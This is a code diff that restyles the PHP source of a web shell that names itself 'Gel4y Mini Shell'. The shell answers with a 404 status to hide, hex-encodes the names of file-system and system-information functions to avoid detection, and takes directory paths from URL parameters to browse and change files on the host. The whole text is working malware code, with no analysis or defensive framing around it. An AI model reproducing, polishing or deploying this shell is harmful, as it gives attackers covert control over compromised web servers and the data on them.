@@ -4,9 +4,8 @@ http_response_code(404);
 define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
 $scD = "s\x63\x61\x6e\x64\x69r";
 $fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
-for ($i = 0; $i < count($fc); $i++) {
+for ($i = 0; $i < count($fc); $i++)
 	$fc[$i] = nhx($fc[$i]);
-}
 if (isset($_GET["p"])) {
 	$p = nhx($_GET["p"]);
 	$fc[3](nhx($_GET["p"]));
@@ -15,38 +14,28 @@ if (isset($_GET["p"])) {
 }
 function hex($str) {
 	$r = "";
-	for ($i = 0; $i < strlen($str); $i++) {
+	for ($i = 0; $i < strlen($str); $i++)
 		$r .= dechex(ord($str[$i]));
-	}
 	return $r;
 }
 function nhx($str) {
 	$r = "";
 	$len = (strlen($str) -1);
-	for ($i = 0; $i < $len; $i += 2) {
+	for ($i = 0; $i < $len; $i += 2)
 		$r .= chr(hexdec($str[$i].$str[$i+1]));
-	}
 	return $r;
 }
 function perms($f) {
 	$p = fileperms($f);
-	if (($p & 0xC000) == 0xC000) {
-		$i = 's';
-	} elseif (($p & 0xA000) == 0xA000) {
-		$i = 'l';
-	} elseif (($p & 0x8000) == 0x8000) {
-		$i = '-';
-	} elseif (($p & 0x6000) == 0x6000) {
-		$i = 'b';
-	} elseif (($p & 0x4000) == 0x4000) {
-		$i = 'd';
-	} elseif (($p & 0x2000) == 0x2000) {
-		$i = 'c';
-	} elseif (($p & 0x1000) == 0x1000) {
-		$i = 'p';
-	} else {
-		$i = 'u';
-	}
+	if (($p & 0xC000) == 0xC000) $i = 's';
+	elseif (($p & 0xA000) == 0xA000) $i = 'l';
+	elseif (($p & 0x8000) == 0x8000) $i = '-';
+	elseif (($p & 0x6000) == 0x6000) $i = 'b';
+	elseif (($p & 0x4000) == 0x4000) $i = 'd';
+	elseif (($p & 0x2000) == 0x2000) $i = 'c';
+	elseif (($p & 0x1000) == 0x1000) $i = 'p';
+	else $i = 'u';
+
 	$i .= (($p & 0x0100) ? 'r' : '-');
 	$i .= (($p & 0x0080) ? 'w' : '-');
 	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
